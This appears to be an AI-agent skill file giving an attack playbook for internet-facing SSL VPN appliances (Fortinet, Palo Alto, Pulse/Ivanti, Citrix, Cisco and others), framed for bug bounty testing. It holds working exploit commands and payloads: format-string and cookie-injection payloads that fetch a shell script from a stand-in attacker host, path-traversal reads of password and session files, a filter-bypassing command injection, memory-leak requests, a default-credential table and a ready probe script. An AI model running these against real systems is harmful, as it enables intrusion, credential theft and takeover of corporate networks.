---
name: ssl-vpn-testing
description: "External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits. Use when target's perimeter exposes any SSL VPN appliance or remote-access gateway."
---

# SSL VPN Attack Surface

**Source:** Orange Tsai (DEVCORE), Black Hat USA / DEFCON 27 (2019)
**CVEs:** CVE-2018-13379/80/81/82/83 (Fortinet), CVE-2019-1579 (Palo Alto), CVE-2019-11510/39/42 (Pulse Secure)
**Affected:** Fortinet FortiOS, Palo Alto GlobalProtect, Pulse Connect Secure

## Why SSL VPNs Are High-Value Targets

- Internet-facing by design (port 443)
- Compromise = full intranet access
- Admin access → push malicious logon scripts to ALL VPN clients
- Often run as root/SYSTEM
- Hundreds of thousands exposed on Shodan

## Fortinet FortiOS (sslvpnd)

### Architecture
- All-in-one binary (`/bin/init`), no standard tools
- Modified Apache from 2002 with custom modules
- WebVPN feature: proxies HTTP/FTP/RDP/WebSocket (heavy string ops → memory bugs)
- Identify via: `/remote/login`

### CVE-2018-13379: Pre-Auth File Read

```c
snprintf(s, 0x40, "/migadmin/lang/%s.json", lang);
```

Buffer overflow in `snprintf` truncates `.json` extension when path exceeds 0x40 bytes → arbitrary file read.

**Impact:** Read session files containing plaintext passwords.

### CVE-2018-13382: Magic Backdoor

Hardcoded `magic` parameter on login page allows changing ANY user's password without authentication.

### CVE-2018-13383: Post-Auth Heap Overflow → RCE

WebVPN JavaScript parsing: `memcpy(buffer, js_buf, js_buf_len)` with fixed 0x2000 buffer.

**Exploitation chain:**
1. Read sessions via CVE-2018-13379 (get plaintext creds)
2. Login, proxy malicious page through WebVPN
3. Heap overflow corrupts `struct SSL` → overwrite `method` function table
4. `SSL_do_handshake()` calls controlled function pointer → ROP chain → reverse shell

**Affected:** FortiOS < 5.4.11, < 5.6.9, < 6.0.5, < 6.2.0

## Palo Alto GlobalProtect (sslmgr)

### CVE-2019-1579: Pre-Auth Format String → RCE

`sslmgr` daemon passes `scep-profile-name` directly as format argument to `snprintf`.

**Verification (non-destructive, time-based):**
```bash
time curl -s -d 'scep-profile-name=%9999999c' https://target/sslmgr >/dev/null
# 1.7s
time curl -s -d 'scep-profile-name=%999999999c' https://target/sslmgr >/dev/null
# 5.3s (increasing = vulnerable)
```

**Exploitation:** Overwrite `strlen` GOT entry with `system` PLT address:
```python
data = "scep-profile-name=" + p32(strlen_GOT)[:-1]
data += "&appauthcookie=" + p32(strlen_GOT+2)[:-1]
data += "&host-id=" + p32(strlen_GOT+4)[:-1]
data += "&user-email=" + fmt_payload
data += "&appauthcookie=" + cmd
```

After GOT overwrite, `sslmgr` becomes a webshell:
```bash
curl -d 'scep-profile-name=curl attacker.com/shell.pl|perl -' https://target/sslmgr
```

**Identify:** 302 redirect to `/global-protect/login.esp`
**Fingerprint version:** `Last-Modified` header on `/global-protect/portal/css/login.css`
**Affected:** GlobalProtect 7.1.x < 7.1.19, 8.0.x < 8.0.12, 8.1.x < 8.1.3

## Pulse Connect Secure

### CVE-2019-11510: Pre-Auth Arbitrary File Read

HTML5 Access feature (v8.2+) loosened path validation. Double path trick:

```python
r = requests.get('https://target/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/')
```

**High-value files to read:**
- Session database (contains plaintext creds from Perl/C++ data exchange)
- `/data/runtime/mtmp/system` — cached credentials
- `/data/runtime/mtmp/lmdb/dataa/data.mdb` — session DB

### CVE-2019-11539: Post-Auth Command Injection (Admin)

`/dana-admin/diag/diag.cgi` passes `options` to tcpdump via `system()`.

**Bypass DSSAFE.pm** (blocks `& * ( ) { } [ ] ; | ? ~ < >`):

Use tcpdump STDERR output as valid Perl code:
```bash
# tcpdump error message becomes Perl:
tcpdump -d -r 'print 123#'
# Output: "tcpdump: print 123#: No such file or directory"
# "tcpdump:" is a valid Perl GOTO label, "#" comments the rest
```

**Final payload:**
```
-r$x="ls /",system$x# 2>/data/runtime/tmp/tt/setcookie.thtml.ttc <
```

**Trigger:** `curl https://target/dana-na/auth/setcookie.cgi`

### Twitter Case Study (Full Chain)

1. Pre-auth file read → download session DB + plaintext creds
2. Bypass Duo 2FA via "Roaming Session" feature (reuse session from any IP)
3. SSRF via WebVPN (VPN proxies to itself) → reach management interface
4. Crack admin password (10 chars, cracked in 3h on 72-core AWS)
5. Command injection → RCE on Twitter infrastructure

**Result:** Highest bounty from Twitter's program.

## CVE-2024-3400: Palo Alto GlobalProtect (2024)

### Stage 1: Path Traversal via SESSID Cookie

`gpsvc` (Go binary) concatenates session ID into filesystem path without sanitization. Creates zero-byte files as root:

```http
POST /ssl-vpn/hipreport.esp HTTP/1.1
Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/cmd`curl${IFS}attacker.com`;
```

### Stage 2: Command Injection via Telemetry Cron

`dt_curl` script interpolates filenames into shell command with `shell=True`:
```python
curl_cmd = "curl -X PUT \"%s\" --data-binary @%s" % (signedUrl, fname)
pansys(curl_cmd, shell=True)
```

**Space bypass:** `${IFS}` (cookie values strip spaces)

**Affected:** PAN-OS 10.2, 11.0, 11.1 (telemetry NOT required)

## Testing Methodology

1. **Identify VPN type:** Check login page, response headers, default paths
2. **Version fingerprint:** Static asset timestamps, error messages
3. **Test pre-auth file read:** Known path traversal patterns per product
4. **Check for patches:** Compare behavior against known CVE indicators
5. **If admin access obtained:** Check logon script feature for client takeover

## Bug Bounty Relevance

- **CRITICAL**: Pre-auth RCE on internet-facing appliances
- **CRITICAL**: Pre-auth file read → credential theft → full network compromise
- **HIGH**: Admin access → push malicious scripts to all VPN clients
- Most enterprise VPNs are in scope for bug bounty programs

---

## Vendor Identification (Fingerprinting)

### Cisco ASA / AnyConnect
```bash
curl -skI 'https://target/+CSCOE+/logon.html' | head -10
# Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN
curl -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled
curl -sk 'https://target/CSCOSSLC/config-auth'             # AnyConnect handshake endpoint
```

### Fortinet FortiGate / FortiOS
```bash
curl -skI 'https://target/remote/login' | head -10
# Look for: Set-Cookie: SVPNCOOKIE=, Server: "xxxxxxxx-xxxxx"
```

### Citrix NetScaler / ADC / Gateway
```bash
curl -skI 'https://target/' | head -10
# Look for: Set-Cookie: NSC_AAA=, NSC_USER=, Server: NetScaler
curl -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'
```

### Palo Alto GlobalProtect
```bash
curl -skI 'https://target/global-protect/login.esp' | head -10
# Look for: Set-Cookie: PHPSESSID=; Page: "GlobalProtect Portal"
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'
```

### Pulse Secure / Ivanti Connect Secure
```bash
curl -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10
# Look for: Set-Cookie: DSAuthSession=, DSPREAUTH=
```

### SonicWall NetExtender / SMA
```bash
curl -skI 'https://target/cgi-bin/welcome' | head -10
# Look for: Set-Cookie: swap=, swapauth=
```

### F5 Big-IP / APM
```bash
curl -skI 'https://target/my.policy' | head -10
# Look for: Set-Cookie: BIGipServer*, MRHSession=
```

---

## Extended CVE Matrix — Pre-Auth or Auth-Bypass (2018-2026)

### Cisco ASA / AnyConnect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-0296** | ASA pre-9.x specific builds | Path traversal — info disclosure | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |
| **CVE-2020-3452** | ASA, FTD before specific patch levels | Path traversal — file read | `GET /+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua` |
| **CVE-2023-20269** | ASA, FTD specific | Auth bypass on SSL VPN | Brute-force group + valid creds combo |
| **CVE-2024-20481** | RAVPN | DoS via crafted handshake | **SKIP — disruptive** |

```bash
# CVE-2020-3452 — file read
curl -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua' | head -5

# CVE-2018-0296 — path traversal
curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua' | head -20
```

### Fortinet FortiGate / FortiOS (additional CVEs)

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2022-42475** | FortiOS 7.x specific | Heap overflow — pre-auth RCE | nuclei template `CVE-2022-42475` |
| **CVE-2023-27997** (XORtigate) | FortiOS various | Heap overflow — pre-auth RCE | nuclei template available |
| **CVE-2024-21762** | FortiOS 6.x-7.x | OOB write — pre-auth RCE | nuclei template `CVE-2024-21762` |
| **CVE-2024-55591** | FortiOS 7.0-7.4 | Auth bypass on Node.js websocket admin | `GET /endpoint` on admin-interface port |

### Citrix NetScaler / ADC / Gateway (additional CVEs)

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2022-27518** | ADC/Gateway with SAML configured | Pre-auth RCE | nuclei |
| **CVE-2023-3519** | NetScaler ADC/Gateway 13.0-13.1 | Pre-auth RCE via crafted HTTP | Public PoCs |
| **CVE-2023-4966** (Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | Memory disclosure → session token theft | Long Host header triggers memory leak |

```bash
# Citrix Bleed (CVE-2023-4966) detection
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt
# If response is large (>10KB) and contains random memory contents — vulnerable
```

### Palo Alto GlobalProtect (additional)

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2024-3400** | PAN-OS 10.2-11.1 with GP enabled | Command injection — pre-auth RCE | Crafted Cookie SESSID with path traversal |

### Pulse Secure / Ivanti Connect Secure (additional CVEs)

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2021-22893** | Pulse Connect Secure 9.x | Pre-auth RCE | Multi-step; nuclei |
| **CVE-2024-21887** | Ivanti Connect Secure 9.1-22.6 | Command injection on web component | Crafted POST body |
| **CVE-2023-46805** | Ivanti Connect Secure 9.1-22.6 | Auth bypass | Combined with 21887 for full chain |

### SonicWall

| CVE | Affects | Type |
|---|---|---|
| **CVE-2021-20016** | SMA 100 series | SQL injection — pre-auth |
| **CVE-2024-40766** | SonicOS specific | Access-control flaw |

---

## SAML SP / IdP Misconfigurations (always check)

Most enterprise VPNs now use SAML for SSO. Check SP metadata:

```bash
# Cisco ASA
curl -sk 'https://target/+CSCOE+/saml/sp/metadata' | head -50

# Fortinet
curl -sk 'https://target/remote/saml/metadata' | head -50

# Citrix
curl -sk 'https://target/saml/login' | head -30
```

Look for:
- `AuthnRequestsSigned="false"` → see saml-bypass-techniques for XSW exploitation
- `WantAssertionsSigned="false"` → severe; assertion-replay possible
- Audience-restriction validation gaps
- Public SP signing cert (for replay/forging attacks)

---

## Default Credentials (test sparingly — lockout risk)

| Vendor | User | Password | Notes |
|---|---|---|---|
| Cisco ASA | admin | cisco | Factory default |
| Cisco ASA | enable_15 | cisco | Console |
| Fortinet | admin | (empty) | Factory default |
| Citrix NetScaler | nsroot | nsroot | Factory default |
| Citrix NetScaler | nsroot | (serial number) | Newer firmware |
| Palo Alto | admin | admin | Factory default |
| Pulse Secure | admin | password | Factory |
| F5 Big-IP | root | default | Factory |
| F5 Big-IP | admin | admin | Common alternate |
| SonicWall | admin | password | Factory |

Most enterprise targets have changed these. Test <=2 attempts per account to avoid lockout.

---

## Group / Tunnel-Group Enumeration (Cisco-specific)

```bash
for group in DefaultRAGroup DefaultWEBVPNGroup SSLVPN Employees Contractors Vendors Partners Sales Marketing IT; do
  ms=$(curl -sk --max-time 10 -o /dev/null -w "%{time_total}" \
    -X POST "https://target/+webvpn+/index.html" \
    -d "username=test&password=test&group_list=$group&tgroup=&Login=Login")
  echo "$group: ${ms}s"
done
# Larger timing differential = group exists
```

---

## AAA Backend Identification

| Pattern in response | AAA backend |
|---|---|
| `a0=2` (Cisco) | Unknown user |
| `a0=3` (Cisco) | Wrong password |
| `a0=4` (Cisco) | Login restricted |
| `a0=12` (Cisco) | Account locked |
| `a0=115` (Cisco) | Generic auth fail (LDAP/RADIUS/AD) |
| AADSTS in response body | Backed by Entra (SAML) |
| `Authentication failed via RADIUS` | RADIUS backend |
| `Invalid username or password` (generic) | LDAP or local DB |

If SAML/Entra in the flow, pivot to `m365-entra-attack` pattern.

---

## Common Probe Sequence (5-minute fingerprint)

```bash
TARGET="vpn.target.com"

# Cisco
curl -skI "https://$TARGET/+CSCOE+/logon.html" 2>&1 | head -3
curl -sk "https://$TARGET/+CSCOE+/saml/sp/metadata" -o /tmp/cisco_saml.xml
curl -sk --path-as-is "https://$TARGET/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest" -o /tmp/cisco_cve.html

# Fortinet
curl -skI "https://$TARGET/remote/login" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -o /tmp/forti_cve.txt

# Citrix
curl -skI "https://$TARGET/" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/vpn/../vpns/cfg/smb.conf" -o /tmp/citrix_cve.txt
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://$TARGET/oauth/idp/.well-known/openid-configuration" -o /tmp/citrix_bleed.txt

# Palo Alto
curl -skI "https://$TARGET/global-protect/login.esp" 2>&1 | head -3

# Pulse / Ivanti
curl -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" -o /tmp/pulse_cve.txt
```

---

## Nuclei Templates for Fast Triage

```bash
nuclei -u https://target/ \
  -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 \
  -severity high,critical -rl 5
```

---

## Operational Discipline

- **Banner-stripped servers** (no version disclosure) are good defense-in-depth — record as positive finding
- **Rate-limit yourself** — appliances log every request to a SIEM
- **SAML metadata is anonymous** — pull it. It's intel about AAA backend
- **Don't run pre-auth-RCE PoCs without explicit OK** — bricking a VPN concentrator = catastrophic
- **Document AAA backend identification** — changes downstream attack paths

---

## Anti-patterns (VPN)

- **Don't conclude "patched" from a 404 on one CVE path** — test 3+ CVEs per vendor
- **Don't trust the version banner alone** — vendors backport fixes without bumping version string
- **Don't run heavy nuclei scans without rate-limiting** — critical infrastructure
- **Don't fingerprint by trying all CVE PoCs immediately** — start with non-disruptive HEAD + version probes
- **Don't skip SAML metadata** — even when patched, SAML SP misconfig is its own attack surface
